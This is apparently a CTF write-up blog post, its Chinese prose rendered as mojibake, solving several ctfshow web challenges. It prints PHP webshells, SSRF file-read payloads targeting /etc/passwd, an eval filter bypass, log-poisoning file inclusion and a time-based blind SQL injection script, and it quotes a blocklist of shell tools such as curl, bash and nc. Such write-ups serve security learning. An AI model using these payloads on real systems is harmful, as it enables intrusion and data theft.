<p>1.ä¹‹å‰ä¸ºäº†åšçº¢åŒ…é¢˜çœ‹è¿‡ä¸€ç¯‡pç‰›çš„æ— æ•°å­—æ— å­—æ¯RCEï¼Œåªä¸è¿‡å½“æ—¶æ²¡æƒ³åˆ°å¯ä»¥è¿™æ ·åšï¼Œä¸‹é¢æ˜¯pç‰›çš„å†™çš„webshellï¼Œç›´æ¥æ‰“å°±è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="string">" "</span>);</span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]);<span class="comment">// // ASSERT($_POST[_]);</span></span><br><span class="line"><span class="comment">//å†postæäº¤_=system("cat /flag");</span></span><br></pre></td></tr></table></figure>

<p>2.æ ¹æ®ä»£ç çš„æ„æ€ï¼Œç”¨${$<em>{7}.$</em>{8}.$<em>{12}.$</em>{19}}å¯ä»¥æ‹¼å‡‘å‡º$hintï¼Œè¿™æ ·å°±èƒ½é¡ºåˆ©ä»¥base64çš„æ–¹å¼è¯»å–hhh.phpæ–‡ä»¶äº†ï¼Œè§£å¯†å¾—åˆ°æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"/phpjiami.zip\n/hint.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½å‹ç¼©åŒ…ï¼Œè§£å¯†æºç ï¼Œå¾—åˆ°ä¸€å¥è¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.rt.e.saucerman"</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>POST</p>
<p><strong>6=system(â€˜cat /flagâ€™);</strong>å°±å¯ä»¥æ‹¿åˆ°flag</p>
<img src="/2020/05/05/ctfshow/%E4%BD%A0%E6%8B%BF%E5%90%A7.png" class="">

<h4 id="0X02ï¼šRemoteImageDownloader"><a href="#0X02ï¼šRemoteImageDownloader" class="headerlink" title="0X02ï¼šRemoteImageDownloader"></a>0X02ï¼šRemoteImageDownloader</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œç»™äº†ä¸€ä¸ªhttpï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Œå¯èƒ½æ˜¯ssrfæ³¨å…¥ï¼Œæµ‹è¯•ä¸€ä¸‹å‘ç°ä¸‹è½½äº†ä¸€å¼ æˆªå›¾å›¾ç‰‡</p>
<p>vpsç›‘å¬</p>
<img src="/2020/05/05/ctfshow/RemoteImageDownloader.png" class="">

<p>æ ¹æ®æç¤ºï¼Œå»æ‰¾èµ„æ–™ï¼Œæœ‰æ–‡ç« <a href="https://www.anquanke.com/post/id/86371ï¼Œé‡Œé¢æœ‰poc" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86371ï¼Œé‡Œé¢æœ‰poc</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è‡ªå·±çš„vpswebæœåŠ¡ç›®å½•ä¸‹èµ·ä¸ªç½‘é¡µï¼Œå†æŠŠç›®æ ‡æ”¹ä¸ºflag</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heaed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">x = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="actionscript">x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="actionscript">x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>);</span></span><br><span class="line">x.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç½‘é¡µç›´æ¥è¯»å–ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p>
<img src="/2020/05/05/ctfshow/RemoteImageDownloader1.png" class="">



<h4 id="0X03ï¼šç»™ä½ shell"><a href="#0X03ï¼šç»™ä½ shell" class="headerlink" title="0X03ï¼šç»™ä½ shell"></a>0X03ï¼šç»™ä½ shell</h4><p>åœ¨ç½‘é¡µæºç å¤„æ‰¾åˆ°äº†è·³è½¬é¡µé¢ï¼Œè·³è½¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">':'</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">'&#123;"secret"'</span> &amp;&amp; preg_match(<span class="string">'/^[\"0-9A-Z]*&#125;$/'</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">'secret'</span>, <span class="string">''</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span><span class="params">($_f_g)</span> </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'secret'</span>]) ? $json = $_COOKIE[<span class="string">'secret'</span>] : setcookie(<span class="string">'secret'</span>, <span class="string">'&#123;"secret":"'</span> . strtoupper(md5(<span class="string">'y1ng'</span>)) . <span class="string">'"&#125;'</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="keyword">true</span>) : <span class="keyword">die</span>(<span class="string">'no'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'give_me_shell'</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">"here is your webshell: $shell_path"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>

<p>é€»è¾‘ï¼š</p>
<ul>
<li>cookieï¼Œå­˜çš„æ˜¯json</li>
<li>checkCookie()å‡½æ•°æ£€æµ‹jsonæ•°æ®åªæœ‰ä¸€å¯¹é”®å€¼å¯¹</li>
<li>secret!=$flag_md5ï¼Œè°ƒç”¨havefunå‡½æ•°ï¼Œå¦åˆ™å°±è¾“å‡ºshellåœ°å€</li>
</ul>
<p>ç»è¿‡æµ‹è¯•ï¼Œæ•°å­—&amp;0xC0éƒ½ä¸º0ï¼Œå­—æ¯&amp;0xC0éƒ½æ˜¯64ï¼Œflagçš„MD5å€¼ä¸º327a6c4304ad5938eaf0efb6cc3e53dcï¼Œåˆšå¥½æ˜¯000æ‰“å¤´ï¼Œå¼±ç±»å‹ç›´æ¥ä¸Šburpçˆ†ç ´</p>
<img src="/2020/05/05/ctfshow/shell1.png" class="">

<p>æ ¹æ®æç¤ºï¼Œåˆ°ä¸‹ä¸€æ­¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hidden_filter.php"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;location.href=\'./index.php\'&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//æ¸…ç©ºsession ä»å¤´å†æ¥</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"\$_SESSION["</span> . $code . <span class="string">"]=false;"</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å°±æ˜¯çœ‹Yingå¸ˆå‚…çš„wpåšäº†ï¼Œfuzzé»‘åå•è¿‡æ»¤äº†ä¸€ä¸‹ä¸œè¥¿</p>
<ul>
<li>fã€sysã€include</li>
<li>æ‹¬å·ã€å¼•å·ã€åˆ†å·</li>
<li>^ &amp;ç­‰è¿ç®—ç¬¦</li>
<li>ç©ºæ ¼ / \ $ ` * #ç­‰ç¬¦å·</li>
</ul>
<p>è¿™é‡Œå¸¦æ‹¬å·çš„å‡½æ•°ï¼Œç©ºæ ¼ï¼Œåˆ†å·éƒ½ä¸èƒ½ä½¿ç”¨ï¼Œå‘½ä»¤æ‹¼æ¥ä¹Ÿæ— æ•ˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br><span class="line">&#x2F;&#x2F;ç”¨?&gt;&lt;?æ¥bypassåˆ†å·</span><br><span class="line">&#x2F;&#x2F;PHPé»‘é­”æ³• requireå’Œå–åè¿ç®—ç¬¦ä¹‹é—´ä¸éœ€è¦ç©ºæ ¼ç…§æ ·æ‰§è¡Œ</span><br><span class="line">&#x2F;&#x2F;æ²¡æœ‰æ‹¬å· ä½¿ç”¨é‚£äº›ä¸éœ€è¦æ‹¬å·çš„å‡½æ•° è¿™é‡Œä½¿ç”¨require</span><br><span class="line">&#x2F;&#x2F;]&#x3D;1æ¥é—­åˆsession</span><br></pre></td></tr></table></figure>

<img src="/2020/05/05/ctfshow/shell2.png" class="">

<p>æ‹¿åˆ°flag</p>
<h4 id="0X04ï¼šWEB-ALL-INFO-U-WANT"><a href="#0X04ï¼šWEB-ALL-INFO-U-WANT" class="headerlink" title="0X04ï¼šWEB_ALL_INFO_U_WANT"></a>0X04ï¼šWEB_ALL_INFO_U_WANT</h4><img src="/2020/05/05/ctfshow/want1.png" class="">

<p>çœ‹åˆ°æç¤ºï¼Œç”¨æ‰«æå™¨æ‰«åˆ°index.php.bak,ä¸‹è½½æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line">&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;give you all information you want</span><br><span class="line">if (isset($_GET[&#39;all_info_i_want&#39;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];</span><br><span class="line">    &#x2F;&#x2F;really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">really really really baby challenge right?</span><br></pre></td></tr></table></figure>

<p>httpå›åŒ…headerå¾—çŸ¥æ˜¯nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">&#x2F;&#x2F;åœ¨user-agentå¤„å†™å…¥ä¸€å¥è¯æœ¨é©¬å³å¯åŒ…å«RCE</span><br></pre></td></tr></table></figure>

<h4 id="0X05ï¼šWEB-Login-Only-For-36D"><a href="#0X05ï¼šWEB-Login-Only-For-36D" class="headerlink" title="0X05ï¼šWEB_Login_Only_For_36D"></a>0X05ï¼šWEB_Login_Only_For_36D</h4><p>æ‰“å¼€æ˜¯ä¸ªæ³¨å…¥é¢˜ï¼Œå¸¸è§„æ‰‹æ®µfuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†ä¸€ä¸‹ä¸œè¥¿</p>
<ul>
<li>å•å¼•å·</li>
<li>select substrç­‰å¾ˆå¤šå…³é”®å­—</li>
<li>= &gt; &lt;</li>
<li>ç©ºæ ¼ â€“ ; |ç­‰ç¬¦å·</li>
</ul>
<p>å‘ç°æºç æœ‰æç¤º</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!-- if (!preg_match('/admin/', $uname)) die; --&gt;</span><br><span class="line">&lt;!-- select * from 36d_user where username='$uname' and password='$passwd'; --&gt;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>admin\</code>æŠŠå•å¼•å·æ³¨é‡Šæ‰è®©åé¢<code>$passwd</code>é€ƒé€¸å‡ºå»</p>
<p>å¸ƒå°”ç›²æ³¨æ— å›æ˜¾ï¼Œç”¨æ—¶é—´ç›²æ³¨ï¼Œä¸Šè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += hex(ord(i))</span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + result</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"https://dc695489-cf68-45f2-97f9-1a21f62ba9e3.chall.ctf.show/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'IABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        password = ord2hex(res + chr(j))</span><br><span class="line">        password = <span class="string">'or/**/if((password/**/REGEXP/**/binary/**/&#123;&#125;),sleep(10),1)#'</span>.format(password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"admin\\"</span>,</span><br><span class="line">            <span class="string">'password'</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        r = req.post(url=url, data=data)</span><br><span class="line">        endtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> endtime - startTime &gt; <span class="number">5</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥å¯†ç æ˜¯ILoVeThlrtySixDï¼Œè·‘äº†å¥½å‡ æ¬¡æ‰è·‘å‡ºæ¥æ­£ç¡®çš„</p>
<h4 id="0X06-WUSTCTF-æœ´å®æ— åRevenge"><a href="#0X06-WUSTCTF-æœ´å®æ— åRevenge" class="headerlink" title="0X06:WUSTCTF__æœ´å®æ— åRevenge"></a>0X06:WUSTCTF__æœ´å®æ— åRevenge</h4><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^0-9.]/'</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"éæ´²æ¬¢è¿ä½ 1"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (preg_match_all(<span class="string">"/\./"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num)==<span class="number">1</span> &amp;&amp; !preg_match(<span class="string">'/^[-]/'</span>, $num))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"æ²¡æœ‰è¿™æ ·çš„æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"éæ´²æ¬¢è¿ä½ 2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"more"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tail"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"less"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"head"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tac"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"sort"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"$"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"curl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"bash"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nc"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"php"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/['\*\"[?]/"</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'éé¢„æœŸä¿®å¤*2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, 